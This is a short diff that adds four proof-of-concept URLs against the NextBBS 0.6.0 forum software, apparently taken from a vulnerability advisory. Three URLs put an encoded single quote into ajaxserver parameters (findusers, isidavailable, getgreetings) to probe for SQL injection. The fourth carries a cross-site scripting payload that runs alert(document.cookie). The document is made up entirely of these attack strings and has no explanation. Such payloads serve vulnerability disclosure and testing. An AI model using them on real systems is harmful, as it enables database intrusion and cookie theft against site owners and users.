@@ -1,0 +1,4 @@
+http://www.example.com/nextbbs.0.6.0/?do=ajaxserver&amp;action=findusers&amp;curstr=war%2527axe
+http://www.example.com/nextbbs.0.6.0/?do=ajaxserver&amp;action=isidavailable&amp;id=war%2527axe
+http://www.example.com/nextbbs.0.6.0/?do=ajaxserver&amp;action=getgreetings&amp;username=war%2527axe
+http://www.example.com/nextbbs.0.6.0/index.php?do=&lt;body+onload=alert(document.cookie);&gt;
